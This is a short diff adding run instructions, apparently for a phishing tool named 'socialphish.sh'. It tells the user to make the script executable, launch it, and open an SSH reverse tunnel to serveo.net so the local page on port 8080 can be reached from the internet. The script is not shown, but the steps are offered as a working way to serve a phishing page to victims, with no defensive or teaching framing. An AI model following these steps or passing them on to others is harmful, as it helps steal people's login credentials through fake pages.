@@ -1,0 +1,6 @@
+1. Open Git Bash
+2. for first time run [chmod +x socialphish.sh]
+3. then run [./socialphish.sh]
+4. open another git bash
+5. for instant tunneling use the code below
+5. type [ssh -R 80:localhost:8080 serveo.net]
